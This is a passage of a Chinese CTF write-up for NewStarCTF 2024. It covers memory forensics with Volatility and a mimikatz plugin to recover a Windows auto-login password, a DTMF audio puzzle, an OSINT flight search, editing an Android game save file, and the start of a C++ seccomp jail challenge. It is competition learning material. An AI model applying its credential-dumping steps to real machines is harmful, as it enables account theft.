<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;vol.exe -f image.raw --profile=Win7SP1x86_23418 dumpfiles -Q 0x00000000f554bf80 -D ./</span><br><span class="line"></span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">DataSectionObject 0xf554bf80   None   \Device\HarddiskVolume2\Users\Xiaohong\Desktop\Diary.txt</span><br></pre></td></tr></table></figure>

<p>打开得到提示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">I think it&#x27;s too tiring to enter a complex password every time I log in, </span><br><span class="line">so it would be nice if I could log in automatically</span><br></pre></td></tr></table></figure>

<p>意思就是<code>Xiaohong</code>账户启用了自动登录，再尝试用mimikatz拿下密码</p>
<div class="note info flat"><h4 id="在新的Kali-WSL中安装volatility2和mimikatz"><a href="#在新的Kali-WSL中安装volatility2和mimikatz" class="headerlink" title="在新的Kali WSL中安装volatility2和mimikatz"></a>在新的Kali WSL中安装volatility2和mimikatz</h4><p>为什么要重装？因为我的Windows里面打包的vol2是个exe文件，里面的库是固定的，而且不能装插件，然后我就再开了个Kali的WSL</p>
<h4 id="安装Python2"><a href="#安装Python2" class="headerlink" title="安装Python2"></a>安装Python2</h4><p>很简单，用apt就行了，但是要先换源</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo sed -i <span class="string">&quot;s@http://http.kali.org/kali@https://mirrors.tuna.tsinghua.edu.cn/kali@g&quot;</span> /etc/apt/sources.list</span><br><span class="line">$ sudo apt update</span><br></pre></td></tr></table></figure>

<p>换源后直接<code>apt install</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install python2 -y</span><br></pre></td></tr></table></figure>

<p>然后还得把pip2安装一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py</span><br><span class="line">$ sudo python2 get-pip.py</span><br></pre></td></tr></table></figure>

<h4 id="安装volatility2"><a href="#安装volatility2" class="headerlink" title="安装volatility2"></a>安装volatility2</h4><p>先从Github把这玩意clone下来</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/volatilityfoundation/volatility.git</span><br><span class="line">$ <span class="built_in">cd</span> volatility</span><br></pre></td></tr></table></figure>

<p>然后就正常的安装过程</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo python2 setup.py install</span><br></pre></td></tr></table></figure>

<p>需要一段时间，会自动安装完毕</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/WindowsTerminal_xcEP87IZmz.png"></p>
<h4 id="安装其他轮子和模块"><a href="#安装其他轮子和模块" class="headerlink" title="安装其他轮子和模块"></a>安装其他轮子和模块</h4><h5 id="pycryptodome-Crypto模块"><a href="#pycryptodome-Crypto模块" class="headerlink" title="pycryptodome(Crypto模块)"></a>pycryptodome(Crypto模块)</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python2 -m pip install pycryptodome -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>

<h5 id="distorm3"><a href="#distorm3" class="headerlink" title="distorm3"></a>distorm3</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/vext01/distorm3</span><br><span class="line">$ <span class="built_in">cd</span> distorm3</span><br><span class="line">$ sudo apt install gcc -y</span><br><span class="line">$ sudo python2 setup.py install</span><br></pre></td></tr></table></figure>

<h5 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ python2 -m pip install construct</span><br><span class="line">$ <span class="built_in">cd</span> /usr/lib/python2.7/dist-packages</span><br><span class="line">$ <span class="built_in">mkdir</span> volatility</span><br><span class="line">$ <span class="built_in">cd</span> volatility</span><br><span class="line">$ <span class="built_in">mkdir</span> plugins</span><br><span class="line">$ wget https://raw.githubusercontent.com/RealityNet/hotoloti/master/volatility/mimikatz.py</span><br><span class="line">$ <span class="built_in">chmod</span> +x mimikatz.py</span><br></pre></td></tr></table></figure>
</div>

<p>运行<code>vol.py --plugin=/usr/lib/python2.7/dist-packages/volatility/plugins -f image.raw --profile=Win7SP1x86_23418 mimikatz</code></p>
<p>结果没有输出，说明<code>mimikatz</code>拿不到密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(ctfos㉿Hello-CTF)-[/usr/lib/python2.7/dist-packages/volatility/plugins]</span><br><span class="line">└─$ vol.py --plugin=/usr/lib/python2.7/dist-packages/volatility/plugins -f image.raw --profile=Win7SP1x86_23418 mimikatz</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">Module   User             Domain           Password</span><br><span class="line">-------- ---------------- ---------------- ----------------------------------------</span><br></pre></td></tr></table></figure>

<p>那没办法了，只能看看怎么拿自动登录的密码了，结果搞了半天没弄出来，所以先放一边</p>
</div></details>

<p>使用PasswareKitForensic可以直接秒杀这个题，因为题目告诉我们是内存镜像，所以直接选内存分析</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/PasswareKitForensic_rTdmn8cREm.png"></p>
<p>试错环节中知道了是Windows电脑，所以只勾选Windows</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/PasswareKitForensic_rpa8zR3TPA.png"></p>
<p>经过差不多五分钟的破解，就出来了，得到密码<code>ZDFyVDlfdTNlUl9wNHNTdzByRF9IQUNLRVIh</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/PasswareKitForensic_rnGXpTr7OR.png"></p>
<p>从而得到flag，flag为<code>flag&#123;ZDFyVDlfdTNlUl9wNHNTdzByRF9IQUNLRVIh&#125;</code></p>
<div class="note info flat"><h4 id="马后炮环节"><a href="#马后炮环节" class="headerlink" title="马后炮环节"></a>马后炮环节</h4><p>vol2其实能做，lsadump可以出来密码，我当时想多了看到乱码以为是错的</p>
<p>除掉开头的H，后面所有的可见字符就是密码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/WindowsTerminal_6E8oq9ht2m.png"></p>
</div>

<h3 id="BGM坏了吗？"><a href="#BGM坏了吗？" class="headerlink" title="BGM坏了吗？"></a>BGM坏了吗？</h3><blockquote>
<p>刚想听一篇推文，但是bgm吵死了，我忍了又忍，摈除杂音仔细听，up难道在拨号吗？(以flag{}形式提交)</p>
<p>【难度：简单】</p>
</blockquote>
<p>题目说拨号，在Audacity里面打开，选择频谱图，可以看到在尾巴，而且只有右声道有</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/audacity_wIq6oHGtu7.png"></p>
<p>直接导出，然后用软件识别</p>
<blockquote>
<p>识别软件dtmf2num：<a href="http://aluigi.altervista.org/mytoolz/dtmf2num.zip">http://aluigi.altervista.org/mytoolz/dtmf2num.zip</a></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/WindowsTerminal_t2iFWLwllx.png"></p>
<p>得到拨号音代表的数字为<code>20240930202411003</code>，但是不对，所以我选择具体来看里面的内容长度，我用的是Github上的一个项目<a href="https://github.com/ribt/dtmf-decoder">dtmp-decoder</a>，详细看就能够看到每一秒的内容</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/WindowsTerminal_fwWOWie2jG.png"></p>
<p>具体可以看到在第一秒的中间，0断了一下，但是假设每一个音的长度相同，则应该是连续的7个<code>0</code>，所以我猜测这里是假的中断（具体看频谱图也能看出来）</p>
<p>所以得到真正的flag是<code>flag&#123;2024093020241103&#125;</code>，提交得分</p>
<h3 id="OSINT-MASTER"><a href="#OSINT-MASTER" class="headerlink" title="OSINT-MASTER"></a>OSINT-MASTER</h3><blockquote>
<p>我重生了，这一世我是osint带师，我一定要找到之前坐过的那架航班！</p>
<p>【难度：简单】</p>
</blockquote>
<p>明显是社工题，下载附件有一张图，一个txt，内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">我重生了，上一世最后一刻我是在一架飞机上。</span><br><span class="line">这一世，我拿着手上这张照片，下定决心，一定要找到之前坐过的那架航班！</span><br><span class="line">flag格式：flag&#123;航班号_照片拍摄时飞机经过的地级市&#125;</span><br><span class="line">示例：flag&#123;YU8915_廊坊市&#125;</span><br></pre></td></tr></table></figure>

<p>图片我放下面</p>
<details class="toggle" ><summary class="toggle-button" style="">题目提供的图片</summary><div class="toggle-content"><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/osint.jpg"></p>
</div></details>

<p>图片内可以看到飞机的相关信息——<code>B-2419</code>，为这架飞机的注册号</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/Photos_KqEzSFyiLT.png"></p>
<p>通过注册号，可以得到航班号为<a href="https://zh.flightaware.com/live/flight/B2419">CES5315</a>或者<code>MU5315</code>，所以可以确定flag前半为<code>CES5315</code>或者<code>MU5315</code>，而在大多数网站中，我发现都是称作<code>MU5315</code>，所以暂且认为前半是<code>MU5315</code></p>
<p>这趟航班，飞行经过的地方有上海市、苏州市、湖州市、杭州市、衢州市、上饶市、南昌市、吉安市、萍乡市、株洲市、衡阳市、郴州市、清远市，终点为广州市</p>
<p>而图片中，我们能够看到云层在飞机的下方，也就是说，飞机现在在巡航高度，也就是距离起点或者终点比较近的位置</p>
<h3 id="AmazingGame"><a href="#AmazingGame" class="headerlink" title="AmazingGame"></a>AmazingGame</h3><blockquote>
<p>出题人们都好狠啊，题做累了不如来玩玩游戏吧，还有就是，安卓软件私有数据会放在哪？(游戏至少通过一个关卡才会有存档)</p>
<p>【难度：简单】</p>
</blockquote>
<p>打开了游戏，因为题目说要完成一把才有存档，所以先手动跑完了第一关</p>
<p>然后去应用的数据目录改存档，一般来说<strong>早期安卓版本</strong>的安卓软件的数据在<code>/data/data/&lt;package_name&gt;/shared_prefs/</code>里面，这个在<code>/data/data/com.pangbai.projectm/shared_prefs/</code>，里面只有一个<code>net.osaris.turbofly.JumpyBall.xml</code>，完成第一把后就可以看到xml文件的详细内容</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27; standalone=&#x27;yes&#x27; ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span> <span class="attr">name</span>=<span class="string">&quot;unlockedsolotracks&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span> <span class="attr">name</span>=<span class="string">&quot;unlockedtracks&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span> <span class="attr">name</span>=<span class="string">&quot;best0m0&quot;</span> <span class="attr">value</span>=<span class="string">&quot;129&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span> <span class="attr">name</span>=<span class="string">&quot;unlockedships&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span> <span class="attr">name</span>=<span class="string">&quot;userid&quot;</span> <span class="attr">value</span>=<span class="string">&quot;289145&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后很明显的就能知道<code>unlockedsolotracks</code>和<code>unlockedtracks</code>是解锁的关卡，而<code>unlockedships</code>是解锁的车子，我们根据题目要求，把关卡改为20，然后把车改为5（因为车子就5个）</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27; standalone=&#x27;yes&#x27; ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span> <span class="attr">name</span>=<span class="string">&quot;unlockedsolotracks&quot;</span> <span class="attr">value</span>=<span class="string">&quot;20&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span> <span class="attr">name</span>=<span class="string">&quot;unlockedtracks&quot;</span> <span class="attr">value</span>=<span class="string">&quot;20&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span> <span class="attr">name</span>=<span class="string">&quot;best0m0&quot;</span> <span class="attr">value</span>=<span class="string">&quot;129&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span> <span class="attr">name</span>=<span class="string">&quot;unlockedships&quot;</span> <span class="attr">value</span>=<span class="string">&quot;5&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span> <span class="attr">name</span>=<span class="string">&quot;userid&quot;</span> <span class="attr">value</span>=<span class="string">&quot;289145&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后打开游戏，发现存档并没有被修改，然后我发现是打开这个软件的那个时候，会自动恢复，应该是有存档校验，所以点击<code>START GAME</code>后再改，然后跑完第二十关得到flag为<code>flag&#123;U_W1n!!_7he_g@m4&#125;</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/MuMuPlayer_Gl46QPJBCs.png"></p>
<h3 id="ez-jail"><a href="#ez-jail" class="headerlink" title="ez_jail"></a>ez_jail</h3><blockquote>
<p>no {} no cpp?</p>
<p>【难度：中等】</p>
</blockquote>
<p>附件下载下来是docker源文件</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/Bandizip.x64_HI2R25JMV4.png"></p>
<p>直接先build</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo docker build -t ez_jail .</span></span><br></pre></td></tr></table></figure>

<p>经过了长达三分钟的build后，就可以准备来跑容器了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/WindowsTerminal_dTzqUhJvky.png"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo docker run -d --name ez_jail_instance ez_jail</span></span><br></pre></td></tr></table></figure>

<p>启动完成后，启动一个容器的终端</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo docker <span class="built_in">exec</span> -it ez_jail_instance /bin/bash</span></span><br></pre></td></tr></table></figure>

<p>使用ls命令，发现当前目录下有<code>server.py</code>和<code>template.cc</code>，内容如下</p>
<h4 id="server-py"><a href="#server-py" class="headerlink" title="server.py"></a>server.py</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cpp_code_checker</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;#include&quot;</span> <span class="keyword">in</span> code:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;Code is not allowed to include libraries&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;#define&quot;</span> <span class="keyword">in</span> code:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;Code is not allowed to use macros&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> code <span class="keyword">or</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> code:</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            <span class="literal">False</span>,</span><br><span class="line">            <span class="string">&quot;Code is not allowed to use `&#123;` or `&#125;`,but it needs to be a single function&quot;</span>,</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(code) &gt; <span class="number">100</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;Code is too long&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>, <span class="string">&quot;Code is valid&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Welcome to the easy cpp code jail!&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Please input your base64 encoded code:&quot;</span>)</span><br><span class="line">    base64_code = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        user_code = base64.b64decode(base64_code).decode()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Invalid base64 code&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    is_valid, msg = cpp_code_checker(user_code)</span><br><span class="line">    <span class="keyword">if</span> is_valid:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Code is valid&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Executing code...&quot;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/home/ctf/template.cc&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            template_code = f.read()</span><br><span class="line">            real_code = template_code.replace(</span><br><span class="line">                <span class="string">&quot;&#123;&#123;your_function_for_printing_hello_world&#125;&#125;&quot;</span>, user_code</span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/tmp/real_code.cc&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(real_code)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            subprocess.run(</span><br><span class="line">                [<span class="string">&quot;g++&quot;</span>, <span class="string">&quot;/tmp/real_code.cc&quot;</span>, <span class="string">&quot;-lseccomp&quot;</span>, <span class="string">&quot;-o&quot;</span>, <span class="string">&quot;/tmp/real_code&quot;</span>],</span><br><span class="line">                check=<span class="literal">True</span>,</span><br><span class="line">                stdout=subprocess.PIPE,</span><br><span class="line">                stderr=subprocess.PIPE,</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">if</span> (</span><br><span class="line">                subprocess.run(</span><br><span class="line">                    [<span class="string">&quot;/tmp/real_code&quot;</span>],</span><br><span class="line">                    check=<span class="literal">True</span>,</span><br><span class="line">                    stdout=subprocess.PIPE,</span><br><span class="line">                    stderr=subprocess.PIPE,</span><br><span class="line">                )</span><br><span class="line">                .stdout.decode()</span><br><span class="line">                .startswith(<span class="string">&quot;Hello, World!&quot;</span>)</span><br><span class="line">            ):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Congratulations! You have successfully executed the code!&quot;</span>)</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;Flag: <span class="subst">&#123;f.read()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;e.stderr.decode()&#125;</span>&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Code is invalid: <span class="subst">&#123;msg&#125;</span>&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h4 id="template-cc"><a href="#template-cc" class="headerlink" title="template.cc"></a>template.cc</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">&#123;&#123;your_function_for_printing_hello_world&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  scmp_filter_ctx ctx = <span class="built_in">seccomp_init</span>(SCMP_ACT_KILL);</span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(write), <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(exit_group), <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_ALLOW, <span class="built_in">SCMP_SYS</span>(newfstatat), <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">seccomp_load</span>(ctx);</span><br><span class="line">  <span class="built_in">user_code</span>();</span><br><span class="line">  <span class="built_in">seccomp_release</span>(ctx);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>在<code>template.cc</code>可以看到有<code>user_code</code>函数，而且上面有<code>&#123;&#123;your_function_for_printing_hello_world&#125;&#125;</code>，所以应该是让我们写一个输出<code>hello world</code>的代码，我们运行一下<code>server.py</code>，看到给我们弹提示</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/WindowsTerminal_auqCpg6B2B.png"></p>
<p>让我们写经过base64编码后的hello world代码，先尝试一下正常写</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">user_code</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后经过b64编码发出去，会弹提示</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/WindowsTerminal_GOzqlNvh3x.png"></p>
<p>就是说告诉我们不能用<code>&#123;&#125;</code>，不愧是题目说的<code>No &#123;&#125; No CPP</code>，那我们就得避免用<code>&#123;&#125;</code>了，尝试使用宏，发现还是不行，它不让我们用宏</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://assets.bili33.top/img/NewStarCTF2024-Writeup/WindowsTerminal_uLmhb94QIN.png"></p>
<p>所以这里就得找能够替代<code>&#123;&#125;</code>，同时也能够符合C++语法的玩意了</p>
<p>而C++的编译分为9个阶段，这里面就是涨芝士的时候了</p>
<h4 id="C-编译的9个阶段"><a href="#C-编译的9个阶段" class="headerlink" title="C++编译的9个阶段"></a>C++编译的9个阶段</h4><ul>
